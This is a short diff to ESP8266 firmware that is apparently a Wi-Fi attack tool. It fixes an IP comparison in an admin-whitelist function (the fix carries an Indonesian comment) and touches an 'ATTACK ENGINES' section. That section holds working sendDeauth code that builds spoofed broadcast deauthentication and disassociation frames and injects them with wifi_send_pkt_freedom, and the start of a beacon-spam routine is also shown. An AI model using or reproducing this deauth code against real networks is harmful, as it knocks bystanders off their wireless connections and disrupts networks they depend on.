@@ -70,7 +70,8 @@ unsigned long last_scan = 0;
 void updateAdminWhitelist() {
   struct station_info *stat_info = wifi_softap_get_station_info();
   while (stat_info != NULL) {
-    if (stat_info->ip.addr == webServer.client().remoteIP().addr) {
+    // FIX: Bandingkan IPAddress secara langsung agar compatible dengan compiler GitHub
+    if (IPAddress(stat_info->ip.addr) == webServer.client().remoteIP()) {
       memcpy(adminMAC, stat_info->bssid, 6);
       break;
     }
@@ -104,16 +105,14 @@ void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len) {
 
 // --- ATTACK ENGINES ---
 void sendDeauth(uint8_t* targetBssid, uint8_t ch) {
-  // Check Whitelist
   if (memcmp(targetBssid, adminMAC, 6) == 0) return;
-
   uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
   memcpy(&pkt[10], targetBssid, 6);
   memcpy(&pkt[16], targetBssid, 6);
   wifi_set_channel(ch);
-  wifi_send_pkt_freedom(pkt, 26, 0); // Deauth
+  wifi_send_pkt_freedom(pkt, 26, 0); 
   pkt[0] = 0xA0;
-  wifi_send_pkt_freedom(pkt, 26, 0); // Disassociate
+  wifi_send_pkt_freedom(pkt, 26, 0); 
 }
 
 void sendBeaconSpam() {
